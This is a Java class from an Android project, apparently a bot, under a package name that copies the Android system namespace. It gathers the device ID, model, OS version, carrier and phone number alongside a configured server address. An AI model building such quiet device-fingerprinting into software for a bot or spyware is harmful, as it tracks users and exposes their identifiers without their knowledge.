package com.android.adobot;

//uid = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
//        device = android.os.Build.MODEL;
//        sdk = Integer.valueOf(Build.VERSION.SDK_INT).toString(); //Build.VERSION.RELEASE;
//        version = Build.VERSION.RELEASE;

import android.Manifest;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;

public class CommonParams {

    SharedPreferences prefs;
    private String server;
    private String uid;
    private String sdk;
    private String version;
    private String phone;
    private String provider;
    private String device;

    public CommonParams(Context context) {
        prefs = context.getSharedPreferences(Constants.PACKAGE_NAME, Context.MODE_PRIVATE);
        server = prefs.getString(Constants.PREF_SERVER_URL_FIELD, Constants.DEVELOPMENT_SERVER);
        uid = Settings.Secure.getString(context.getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        sdk = Integer.valueOf(Build.VERSION.SDK_INT).toString();
        version = Build.VERSION.RELEASE;

        TelephonyManager telephonyManager = ((TelephonyManager) context.getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE));
        provider = telephonyManager.getNetworkOperatorName();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            phone = telephonyManager.getLine1Number();
        }
        device = android.os.Build.MODEL;

    }

    public String getServer() {
        return this.server;
    }

    public String getUid() {
        return this.uid;
    }

    public String getSdk() {
        return this.sdk;
    }

    public String getVersion() {
        return version;
    }

    public String getPhone() {
        return phone;
    }

    public String getProvider() {
        return provider;
    }

    public String getDevice() {
        return device;
    }
}
